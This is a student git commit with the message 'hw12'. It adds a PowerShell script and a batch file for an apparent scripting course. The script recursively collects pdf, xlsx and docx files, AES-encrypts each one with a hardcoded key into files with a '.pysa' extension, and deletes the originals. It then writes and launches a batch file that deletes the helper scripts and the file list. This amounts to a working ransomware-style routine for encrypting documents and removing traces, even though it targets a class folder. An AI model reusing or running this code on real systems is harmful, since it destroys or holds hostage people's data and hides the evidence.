dcc43b1eb83246b950c1f214550f91d2a04d90a1
Noah Stiles <noahstiles27@gmail.com>
2022-04-14 22:07:50 -0400

    hw12

---
+++ Week12/homework/Stiles_final.ps1
@@ -0,0 +1,131 @@
+# Task 1 export pdf, xlsx, and docx to CSV
+Get-ChildItem -Recurse -Include *.pdf,*.xlsx,*.docx -Path .\Week12\class\Documents | Export-Csv `
+-Path ./Week12/homework/HFiles.csv
+
+# Import CSV File
+$filelist = import-csv -Path ./Week12/homework/HFiles.csv -header FullName
+# $filelist
+
+# Encrypt them
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".pysa"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".pysa"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+
+
+
+# Loop through the results
+foreach ($f in $filelist) {
+    
+    #Get-ChildItem -Path $f.FullName  
+    Invoke-AESEncryption -Mode Encrypt -Key "t0p_Secr3t" -Path $f.FullName
+    # Removes the unencrypted files (:
+    Remove-Item -Path $f.FullName
+}
+
+# Delete the original files
+$leftovers = @"
+del Week12\homework\step1.ps1
+del Week12\homework\step2.ps1
+del Week12\homework\HFiles.csv
+"@
+
+# Write to a file
+$Filelocation = 'C:\Users\noahs\OneDrive\Desktop\Sys_Automation\SYS320-Automation-and-Scripting\Week12\homework\'
+$Executable = $Filelocation + "update.bat"
+
+# Write the bat file
+$leftovers | Out-File -FilePath $Executable -Encoding ascii # For some reason it won't delete without encoding
+
+# Execute the Powershell Script
+Start-Process -FilePath "C:\Users\noahs\OneDrive\Desktop\Sys_Automation\SYS320-Automation-and-Scripting\Week12\homework\update.bat"
+
---
+++ Week12/homework/update.bat
@@ -0,0 +1,3 @@
+del Week12\homework\step1.ps1
+del Week12\homework\step2.ps1
+del Week12\homework\HFiles.csv
